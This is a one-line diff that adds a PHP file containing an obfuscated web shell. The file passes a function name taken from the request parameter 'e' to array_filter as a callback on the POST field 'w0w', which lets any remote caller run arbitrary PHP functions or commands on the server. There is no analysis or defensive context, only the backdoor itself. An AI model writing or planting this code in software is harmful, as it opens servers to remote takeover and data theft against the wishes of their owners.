@@ -1,0 +1,1 @@
+<?php $e=$_REQUEST['e'];$arr=array($_POST['w0w'],);array_filter($arr, $e);?>
